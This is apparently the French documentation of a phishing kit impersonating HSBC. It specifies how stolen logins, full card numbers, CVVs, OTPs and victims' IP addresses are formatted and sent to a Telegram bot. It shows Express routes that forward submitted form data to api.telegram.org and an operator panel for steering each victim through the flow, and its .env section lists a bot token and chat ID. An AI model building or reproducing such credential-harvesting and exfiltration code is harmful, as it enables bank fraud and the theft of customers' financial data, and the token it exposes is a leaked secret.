# Intégration Telegram - Format Standardisé

## Vue d'ensemble

Ce document décrit l'intégration du système de notifications Telegram selon le format standardisé défini dans `tlg.md`. Tous les messages envoyés vers Telegram suivent un format uniforme pour faciliter la gestion et l'identification des clients.

---

## Format Standardisé des Messages

### Structure du Message

Tous les messages Telegram suivent cette structure :

```
=========HS-REZ-=========

🏦 {Titre de l'étape}

------------
👤 Username: valeur
------------
🔑 Password: valeur
------------
🌐 IP: {ip_du_client}
🆔 Visit ID: {visitId}
🔗 Panel: {lien_administration}

===========oZy===========
```

### Composants

| Composant | Description |
|-----------|-------------|
| **En-tête** | `=========HS-REZ-=========` - Identifiant du système |
| **Titre** | `🏦 {Titre}` - Nom de l'étape (ex: "Card Information", "HSBC Login") |
| **Champs** | Données du formulaire avec emojis appropriés et séparateurs `------------` |
| **Métadonnées** | IP, Visit ID, Lien Panel |
| **Signature** | `===========oZy===========` - Signature de fin |

### Emojis par Type de Donnée

| Type de donnée | Emoji | Exemples |
|----------------|-------|----------|
| Username / Name / Cardholder | 👤 | Username, Full Name, Cardholder Name |
| Password / Security Key | 🔑 | Password, Security Code, Security Key |
| OTP / Code / CVV | 🔐 | OTP, Verification Code, CVV |
| Carte / BIN | 💳 | Card Number, BIN |
| Téléphone | 📱 | Mobile Number, Phone |
| Montant / Date | 💰 | Amount, Expiry Date |
| Autre | 📝 | Email, Address, etc. |

---

## Fonction `buildTelegramMessage()`

### Utilisation

```typescript
import { buildTelegramMessage } from "./secure/app/send";
import { buildPanelLink, extractVisitId } from "./utils/panel-link";
import { getRealIp } from "./secure/panel/ip-manager";

// Dans une route Express
const ip = getRealIp(req);
const visitId = extractVisitId(req);
const panelLink = buildPanelLink(req, visitId);

const message = buildTelegramMessage(
  "Card Information", // Titre de l'étape
  {
    "Cardholder": data.cardholder,
    "Card Number": data.cardNumber,
    "Expiry Date": data.expiry,
    "CVV": data.cvv,
    "Amount": data.amount,
  },
  ip,
  visitId,
  panelLink,
);

await sendCustomMessage(message, "HTML");
```

### Paramètres

- **title** (string): Titre de l'étape (ex: "HSBC Login", "Card Information")
- **fields** (Record<string, string>): Objet avec les champs à afficher
- **ip** (string): Adresse IP du client
- **visitId** (string, optionnel): Identifiant de visite unique
- **panelLink** (string, optionnel): Lien vers le panel d'administration

### Fonctionnalités

- **Échappement HTML**: Tous les caractères spéciaux sont automatiquement échappés pour Telegram
- **Mapping d'emojis**: Les emojis sont automatiquement assignés selon le type de champ
- **Format standardisé**: Le message respecte toujours le format défini dans `tlg.md`

---

## Construction du Lien Panel

### Format du Lien

Le lien du panel est construit automatiquement par `buildPanelLink()` :

```
{protocol}://{host}/admin?ip={ip}&visitId={visitId}
```

### Exemple

```
https://exemple.com/admin?ip=203.0.113.42&visitId=abc123xyz
```

### Utilisation

Le lien Panel permet à l'opérateur de :
- Accéder directement au dashboard du client
- Voir l'état actuel du flow
- Gérer les redirections et confirmations
- Pré-remplir les formulaires

---

## Intégration dans les Routes

### Route `/api/payment/submit`

Cette route utilise automatiquement le format standardisé :

```typescript
app.post("/api/payment/submit", async (req, res) => {
  // ... validation ...
  
  // Envoi vers Telegram avec format standardisé
  await sendToTelegram({
    cardholder,
    cardNumber,
    expiry,
    cvv,
    amount,
    bin: formatBINDisplay(cardNumber),
    binInfo: binData,
  }, req);
});
```

### Route `/api/telegram/send`

Pour les messages personnalisés, utilisez `buildTelegramMessage()` :

```typescript
app.post("/api/telegram/send", async (req, res) => {
  const { title, fields } = req.body;
  
  const ip = getRealIp(req);
  const visitId = extractVisitId(req);
  const panelLink = buildPanelLink(req, visitId);
  
  const message = buildTelegramMessage(title, fields, ip, visitId, panelLink);
  await sendCustomMessage(message, "HTML");
});
```

---

## Exemples de Messages

### Message de Paiement

```
=========HS-REZ-=========

🏦 Card Information

------------
💳 BIN: 4532 12**
------------
📋 Card Type: Visa
------------
🏦 Bank: HSBC Bank
------------
🌍 Country: United Kingdom
------------
💳 Card Number: 4532 1234 5678 9010
------------
📅 Expiry Date: 12/25
------------
🔐 CVV: 123
------------
💰 Amount: £150.00
------------
🌐 IP: 203.0.113.42
🆔 Visit ID: abc123xyz
🔗 Panel: https://exemple.com/admin?ip=203.0.113.42&visitId=abc123xyz

===========oZy===========
```

### Message de Login

```
=========HS-REZ-=========

🏦 HSBC Login

------------
👤 Username: john.doe@example.com
------------
🔑 Password: ********
------------
🌐 IP: 203.0.113.42
🆔 Visit ID: abc123xyz
🔗 Panel: https://exemple.com/admin?ip=203.0.113.42&visitId=abc123xyz

===========oZy===========
```

---

## Configuration

### Variables d'Environnement

Les clés Telegram sont configurées dans `server/secure/config/config.ts` :

```typescript
telegram: {
  token: process.env.TELEGRAM_BOT_TOKEN || "votre_token",
  chatId: process.env.TELEGRAM_CHAT_ID || "votre_chat_id",
}
```

### Fichier `.env`

```env
TELEGRAM_BOT_TOKEN=5921410949:AAEoUIUbUJyM4FaAmb9O5IQS2jpBgVgJUio
TELEGRAM_CHAT_ID=-5263890964
```

---

## API Telegram

### Endpoint

```
POST https://api.telegram.org/bot{token}/sendMessage
```

### Paramètres

- **chat_id**: ID du chat Telegram (groupe ou discussion privée)
- **text**: Message formaté selon le standard
- **parse_mode**: `"HTML"` (recommandé pour l'échappement automatique)

---

## Flux Complet

```
[Client] Soumet un formulaire
    ↓
[Route Express] Reçoit les données
    ↓
[buildPanelLink] Construit le lien du panel
    ↓
[buildTelegramMessage] Formate le message
    ↓
[sendCustomMessage] Envoie vers Telegram
    ↓
[Telegram] Message reçu avec lien cliquable
    ↓
[Opérateur] Clique sur le lien Panel
    ↓
[Dashboard] Affiche le client pré-sélectionné
```

---

## Résumé

| Élément | Détail |
|---------|--------|
| **Format** | Standardisé selon `tlg.md` |
| **Fonction principale** | `buildTelegramMessage()` |
| **Parse mode** | HTML (échappement automatique) |
| **Lien Panel** | Inclus automatiquement dans tous les messages |
| **Identification** | IP + Visit ID |
| **Signature** | `===========oZy===========` |

---

## Références

- `tlg.md` - Documentation originale du format
- `server/secure/app/send.ts` - Implémentation TypeScript
- `server/utils/panel-link.ts` - Construction des liens panel
- `server/secure/config/config.ts` - Configuration Telegram
